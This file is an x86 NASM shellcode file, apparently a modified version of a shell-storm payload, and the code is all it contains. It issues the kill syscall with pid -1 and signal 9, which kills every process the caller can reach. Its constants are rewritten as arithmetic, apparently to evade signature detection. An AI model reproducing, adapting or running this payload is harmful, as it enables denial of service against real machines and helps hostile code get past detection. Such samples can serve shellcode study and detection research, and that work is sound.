; Filename: 212-modified.nasm
; original: http://shell-storm.org/shellcode/files/shellcode-212.php

global _start			

section .text
_start:

    push byte 38
    pop eax
    sub eax, 1
    xor ebx, ebx
    not ebx
    push byte 10
    pop ecx
    sub ecx, 1
    int 0x80
